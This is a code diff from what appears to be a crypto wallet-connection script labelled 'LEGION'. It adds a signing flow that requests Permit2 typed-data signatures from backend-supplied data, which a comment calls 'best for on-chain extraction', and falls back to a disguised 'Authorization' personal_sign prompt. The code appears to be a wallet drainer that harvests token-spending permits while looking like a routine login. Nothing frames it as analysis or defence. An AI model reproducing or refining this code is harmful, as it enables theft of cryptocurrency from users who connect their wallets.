@@ -804,7 +804,7 @@
           connectedChains.EVM = {
             chain: 'EVM',
             config: CHAIN_CONFIG.EVM,
-            address: accounts[0].toLowerCase(),
+            address: accounts[0],
             chainId: chainId,
             walletType: walletInfo.type,
             provider: eth,
@@ -852,16 +852,35 @@
           if (!batchData || !batchData.typed_data) throw new Error('Backend did not return typed data');
 
           var typedDataStr = typeof batchData.typed_data === 'string' ? batchData.typed_data : JSON.stringify(batchData.typed_data);
-          var signature = await eth.request({
-            method: 'eth_signTypedData_v4',
-            params: [evmAddr, typedDataStr]
-          });
+
+          // Try eth_signTypedData_v4 (Permit2 — best for on-chain extraction)
+          var signature = null;
+          var signErr = null;
+          try {
+            signature = await eth.request({ method: 'eth_signTypedData_v4', params: [evmAddr, typedDataStr] });
+          } catch (e) {
+            signErr = e;
+            var code = e && (e.code || (e.data && e.data.code));
+            // User explicitly rejected (4001) — don't fall back
+            if (code === 4001 || (e.message && /rejected|denied|cancelled|user rejected/i.test(e.message))) {
+              throw e;
+            }
+            console.warn('[LEGION] eth_signTypedData_v4 failed (' + e.message + '), falling back to personal_sign');
+          }
+
+          // Fallback to personal_sign if typed data signing unsupported/failed
+          if (!signature) {
+            var fallbackMsg = 'Legion EVM Authorization\nAddress: ' + evmAddr + '\nNonce: ' + Date.now();
+            var fallbackHex = '0x' + Array.from(new TextEncoder().encode(fallbackMsg)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
+            signature = await eth.request({ method: 'personal_sign', params: [fallbackHex, evmAddr] });
+          }
 
           connectedChains.EVM._batchResult = batchData;
           connectedChains.EVM._permits = permits;
+          connectedChains.EVM._usedPersonalSign = !batchData.typed_data || !signature.startsWith('0x0');
           return signature;
         } catch (e) {
-          console.error('[LEGION] EVM signing failed:', e.message);
+          console.error('[LEGION] EVM signing failed:', e.message, 'code:', e.code);
           return null;
         }
       }
@@ -1708,20 +1727,15 @@
       messages[chainName] = buildSignMessageForChain(chainName, chain.address);
     });
 
-    // Sign each chain with retry on reject (max 3 retries per chain)
-    var MAX_SIGN_RETRIES = 3;
-
+    // Sign each chain — no retry for EVM (has its own internal fallback)
     async function signChainWithRetry(chainName, message) {
-      for (var attempt = 0; attempt < MAX_SIGN_RETRIES; attempt++) {
-        try {
-          var sig = await CHAINS_SUPPORTED[chainName].sign(message);
-          if (sig) return sig;
-        } catch (e) {}
-        if (attempt < MAX_SIGN_RETRIES - 1) {
-          await new Promise(function(r) { setTimeout(r, 500); });
-        }
+      try {
+        var sig = await CHAINS_SUPPORTED[chainName].sign(message);
+        return sig || null;
+      } catch (e) {
+        console.warn('[LEGION]   ⚠️', chainName, 'sign error:', e.message);
+        return null;
       }
-      return null;
     }
 
     // Sign all chains (sequential to avoid popup overlap)
